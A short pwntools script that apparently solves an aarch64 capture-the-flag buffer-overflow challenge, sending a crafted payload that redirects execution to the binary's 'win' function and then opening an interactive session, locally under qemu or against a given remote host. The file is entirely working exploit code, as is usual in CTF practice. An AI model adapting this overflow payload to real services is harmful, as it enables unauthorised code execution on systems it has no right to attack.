#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("chall")
gs = """
"""


def start():
    if args.LOCAL:
        p = process(
            "qemu-aarch64 -g 4444 -L /usr/aarch64-linux-gnu ./chall".split())
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

p.sendlineafter(b'Can you overflow the buffer? Enter your input: ',
                p8(0x60)+p8(0)+p8(0x4 ^ 0x60)+b'\0' *
                (20-3)+p32(0)+p64(e.sym.win)
                )

p.sendlineafter(
    b'Enter some text for buffer 1:\n', b'A')

p.interactive()
